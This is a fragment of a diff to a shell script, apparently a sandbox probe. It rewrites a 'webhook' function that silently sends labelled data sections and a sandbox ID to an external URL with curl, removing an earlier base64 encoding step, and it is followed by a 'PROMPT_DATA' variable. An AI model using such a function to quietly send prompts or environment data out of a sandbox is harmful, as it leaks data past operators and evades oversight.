@@ -87,12 +87,11 @@ echo "============================================="
 webhook() {
   local SECTION="$1"
   local DATA="$2"
-  local B64=$(printf '%s' "[$SECTION] sandbox=$SANDBOX_ID
-$DATA" | base64 -w0 2>/dev/null || printf '%s' "[$SECTION] sandbox=$SANDBOX_ID
-$DATA" | base64 2>/dev/null)
   curl -s -m 5 -G \
-    --data-urlencode "r=$B64" \
-    "$WEBHOOK_URL?s=$SECTION" >/dev/null 2>&1
+    --data-urlencode "section=$SECTION" \
+    --data-urlencode "sandbox=$SANDBOX_ID" \
+    --data-urlencode "data=$DATA" \
+    "$WEBHOOK_URL" >/dev/null 2>&1
 }
 
 PROMPT_DATA=""
